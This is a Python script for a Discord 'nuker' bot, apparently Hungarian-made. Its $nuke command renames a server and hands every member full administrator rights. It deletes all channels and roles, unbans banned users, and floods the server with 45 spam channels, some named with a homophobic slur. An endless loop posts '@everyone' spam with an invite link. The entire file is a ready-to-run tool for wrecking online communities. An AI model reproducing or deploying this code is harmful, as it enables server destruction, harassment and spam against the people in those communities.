import os
import discord
import random
import json
from discord.ext import commands
from discord import Permissions
from discord.ext.commands import MissingPermissions
from pystyle import Colorate, Colors

intents = discord.Intents.all()
intents.members = True

config = r"moon.json"

with open(config, 'r') as f:
  config = json.load(f)
  server_name = config["server_name"]
  token = config["token"]
  DiscordID = config["DiscordID"]
  bot_status = config["bot_status"]


SPAM_CHANNEL = ["Moon owns you", "Moon Nuked You", "Faggots", "L"]
SPAM_MESSAGE = ["@everyone Most sírsz? https://discord.gg/rAQwJ8FHJZ"]

client = commands.Bot(command_prefix="$")

os.system('cls')

def _print(text):
    print(Colorate.Horizontal(Colors.blue_to_cyan, text))

def banner():
  _print('''
   ▄▄▄▄███▄▄▄▄    ▄██████▄   ▄██████▄  ███▄▄▄▄        ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄ ███    ███ ███    ███ ███▀▀▀██▄      ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███   ███    ███ 
 ███   ███   ███ ███    ███ ███    ███ ███   ███      ███   ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ 
 ███   ███   ███ ███    ███ ███    ███ ███   ███      ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
 ███   ███   ███ ███    ███ ███    ███ ███   ███      ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
 ███   ███   ███ ███    ███ ███    ███ ███   ███      ███   ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████ 
 ███   ███   ███ ███    ███ ███    ███ ███   ███      ███   ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ 
  ▀█   ███   █▀   ▀██████▀   ▀██████▀   ▀█   █▀        ▀█   █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███ 
                                                                             ▀                        ███    ███               
   $nuke - szerver szetbaszas     $stop - stoppolas                                         
''')

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name=bot_status))
  os.system(f'cls & mode 81,25 & title Luna Nuker - Made by Smug')
  banner() 

@client.event
async def on_command_error(ctx, error):
  if isinstance(error, MissingPermissions):
    await ctx.send("Nincs jogod ennek a parans használatához")
    _print("Nincs jogod ennek a parans használatához")
  else:
    await ctx.send("nem létező command")
    _print("Nem létező command")

@client.command()
async def stop(ctx):
  await ctx.message.delete()
  msg = await ctx.send(f"Restart '{client.user.name}'...")
  await msg.delete()
  os.system("Moon.py")
  exit()

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await guild.edit(name=server_name)
    _print(f"'{client.user.name}'a szerver neve átváltozott erre "+ server_name)
    _print(f"'{ctx.author}' futtatta a parancsot")
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      _print("Mindenki kap admint!.")
    except:
      _print("Mindenki kap admint!")
    for channel in guild.channels:
      try:
        await channel.delete()
        _print(f"{channel.name} törölve lett")
      except:
        _print(f"{channel.name} nem lett törölve")
    for role in guild.roles:
     try:
       await role.delete()
       _print(f"{role.name} Törölve lett")
     except:
       _print(f"{role.name} nem lett törölve")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(DiscordID)
        _print(f"{user.name}#{user.discriminator} Unbannolva lett")
      except:
        _print(f"{user.name}#{user.discriminator} Nem lett unbannolva")
    await guild.create_text_channel("Moon szétbaszott")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        _print(f"Új invite:: {link}")
    amount = 45
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))



client.run(token, bot=True)
